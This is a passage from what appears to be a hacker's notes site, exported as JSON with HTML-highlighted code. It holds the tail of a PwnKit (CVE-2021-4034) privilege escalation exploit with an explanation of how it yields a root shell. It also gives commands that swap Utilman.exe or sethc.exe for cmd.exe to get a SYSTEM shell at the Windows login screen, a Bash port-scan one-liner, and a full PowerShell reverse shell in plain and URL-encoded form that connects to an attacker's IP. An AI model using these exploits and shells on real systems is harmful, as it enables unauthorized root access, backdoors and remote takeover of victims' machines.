style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;%s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tfclose&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\tsystem&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tchar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; *&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;[]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;pwnkit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;PATH=GCONV_PATH=.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;CHARSET=PWNKIT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SHELL=pwnkit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; NULL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; };&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\texecve&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/usr/bin/pkexec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; (&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char*[]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;){&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;NULL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;},&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The exploit is then as simple as &lt;code&gt;gcc $FILE -o exploit; ./exploit&lt;/code&gt;.&lt;/p&gt;\n&lt;blockquote class=&quot;callout caution&quot; data-callout=&quot;caution&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Caution&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;This version of the exploit will leave traces in the target’s logs!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Here’s &lt;a href=&quot;https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;what happens on execution&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;The exploit creates the path &lt;code&gt;GCONV_PATH=.&lt;/code&gt; in the current directory and adds an invalid executable file to it.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;The exploit creates a second directory called pwnkit and sets up a malicious shared library designed to be loaded by GLib to translate system messages to the made-up character set “PWNKIT”.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;The exploit calls &lt;code&gt;pkexec&lt;/code&gt; with a NULL argument list (this bit is important, since we need the length of the argument list to be 0 — so, not even to contain the name of &lt;code&gt;pkexec&lt;/code&gt; itself) &lt;em&gt;but&lt;/em&gt; with a correctly set up (albeit malicious) environment via &lt;code&gt;execve()&lt;/code&gt;. Importantly, the first “variable” in the environment is actually the name of the (invalid) executable in the &lt;code&gt;GCONV_PATH=.&lt;/code&gt; directory.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Polkit just falls through the loop that it would normally use to walk through the passed-in arguments. This causes what would be pointing to an executable name to instead point to the first environment variable that’s passed into &lt;code&gt;execve()&lt;/code&gt;, which happens to be string pwnkit.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Polkit looks up the malicious executable, finds it in &lt;code&gt;GCONV_PATH=./pwnkit&lt;/code&gt; (because we set the PATH to that directory), and then tries to replace the executable name with this full path. &lt;em&gt;Except&lt;/em&gt; that it’s still writing to the first element of the environment, which causes pwnkit to be replaced by &lt;code&gt;GCONV_PATH=./pwnkit&lt;/code&gt;.&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Polkit the proceeds to sanitize its environment. When it comes to the invalid &lt;code&gt;SHELL&lt;/code&gt; variable this sanitization fails and Polkit throws an error and dies. &lt;em&gt;But!&lt;/em&gt; Before dying, Polkit tries to &lt;em&gt;print&lt;/em&gt; the error using a GLib function that dutifully attempts to translate the message into the “PWNKIT” character set. To figure out how to do this, modules are loaded from &lt;code&gt;GCONV_PATH&lt;/code&gt;… And we’ve defined a malicious module to do this that cleans up the exploit files and spawns a root shell (since &lt;code&gt;pkexec&lt;/code&gt; is SUID root).&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;"},"spells/Pop-a-SYSTEM-shell-on-the-Windows-login-screen-using-Utilman":{"slug":"spells/Pop-a-SYSTEM-shell-on-the-Windows-login-screen-using-Utilman","filePath":"spells/Pop a SYSTEM shell on the Windows login screen using Utilman.md","title":"Pop a SYSTEM shell on the Windows login screen using Utilman","links":[],"tags":["Application/icacls","Application/takeown","AttackCycle/Exploitation","OS/Windows","HowTo"],"content":"Utilman.exe is the built-in Windows app to provide Ease of Access options from the lock screen. It’s launched by clicking on the Ease of Access button.\n# Take ownership of the file (requires admin privileges).\n#\ntakeown /f C:\\Windows\\System32\\Utilman.exe\n \n# Grant the current user permission to modify it.\n#\nicacls C:\\Windows\\System32\\Utilman.exe /grant $CURRENT_USER:F\n \n# Overwrite with cmd.exe.\n#\ncopy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe","richContent":"&lt;p&gt;Utilman.exe is the built-in Windows app to provide Ease of Access options from the lock screen. It’s launched by clicking on the Ease of Access button.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Take ownership of the file (requires admin privileges).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;takeown &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;f C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Utilman.exe&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Grant the current user permission to modify it.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;icacls C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Utilman.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;grant &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;CURRENT_USER:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;F&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Overwrite with cmd.exe.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;copy C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cmd.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Utilman.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Pop-a-SYSTEM-shell-on-the-Windows-login-screen-using-sticky-keys":{"slug":"spells/Pop-a-SYSTEM-shell-on-the-Windows-login-screen-using-sticky-keys","filePath":"spells/Pop a SYSTEM shell on the Windows login screen using sticky keys.md","title":"Pop a SYSTEM shell on the Windows login screen using sticky keys","links":[],"tags":["Application/icacls","OS/Windows","Application/takeown","AttackCycle/Exploitation","HowTo"],"content":"Pressing Shift 5 times triggers C:\\Windows\\System32\\sethc.exe. On unencrypted Windows systems, replacing that with cmd.exe will let you get a shell running as SYSTEM from the login screen.\n# Take ownership of the file (requires admin privileges).\n#\ntakeown /f c:\\Windows\\System32\\sethc.exe\n \n# Grant the current user permission to modify it.\n#\nicacls C:\\Windows\\System32\\sethc.exe /grant $CURRENT_USER:F\n \n# Overwrite with cmd.exe.\n#\ncopy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe","richContent":"&lt;p&gt;Pressing Shift 5 times triggers &lt;code&gt;C:\\Windows\\System32\\sethc.exe&lt;/code&gt;. On unencrypted Windows systems, replacing that with cmd.exe will let you get a shell running as SYSTEM from the login screen.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Take ownership of the file (requires admin privileges).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;takeown &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;f c:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sethc.exe&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Grant the current user permission to modify it.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;icacls C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sethc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;grant &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;CURRENT_USER:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;F&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Overwrite with cmd.exe.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;copy c:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;cmd.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; C:\\Windows\\System32\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;sethc.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Port-scanning-with-Bash":{"slug":"spells/Port-scanning-with-Bash","filePath":"spells/Port scanning with Bash.md","title":"Port scanning with Bash","links":[],"tags":["Language/Bash","AttackCycle/Reconnaissance","Protocol/TCP"],"content":"(: &lt;/dev/tcp/$IP_ADDRESS/$PORT) &amp;&gt;/dev/null &amp;&amp; echo &quot;OPEN&quot; || echo &quot;CLOSED&quot;","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/dev/tcp/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; &amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/dev/null &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;&amp;#x26;&amp;#x26;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;OPEN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; ||&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;CLOSED&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/PowerShell-reverse-shell":{"slug":"spells/PowerShell-reverse-shell","filePath":"spells/PowerShell reverse shell.md","title":"PowerShell reverse shell","links":["spells/whoami","spells/PHP"],"tags":["Application/PowerShell","AttackCycle/Exploitation","Application/whoami","Language/PHP"],"content":"A pure PowerShell reverse shell:\n$client = New-Object System.Net.Sockets.TCPClient(&#039;&lt;IP&gt;&#039;, &lt;PORT&gt;);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535 | %{0};\nwhile (( $i = $stream.Read($bytes, 0, $bytes.Length) ) -ne 0) {\n\t$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);\n\t$sendback = ( iex $data 2&gt;&amp;1 | Out-String );\n\t$sendback2 = $sendback + &#039;PS &#039; + (pwd).Path + &#039;&gt; &#039;;\n\t$sendbyte = ( [text.encoding]::ASCII ).GetBytes($sendback2);\n\t$stream.Write($sendbyte, 0, $sendbyte.Length);\n\t$stream.Flush()\n}\n$client.Close()\nURL-encoded version (uses powershell -c &quot;$CODE&quot;):\npowershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22\n\nNote that &lt;IP&gt; and &lt;PORT&gt; need to be appropriately replaced in the above code.\nOne annoying thing about this reverse shell… There’s no initial prompt, so you have no idea whether you’ve connected or not. but as soon as you enter a command (whoami, etc.), a prompt will appear after the output. On the plus side, however, this reverse shell will persist even after the PHP script times out!","richContent":"&lt;p&gt;A pure PowerShell &lt;a href=&quot;https://twitter.com/rootsecdev/status/1487612184498774019&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;reverse shell&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; System.Net.Sockets.TCPClient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&amp;#x3C;IP&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stream&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;client.GetStream&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;byte&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[]]$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;bytes&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span 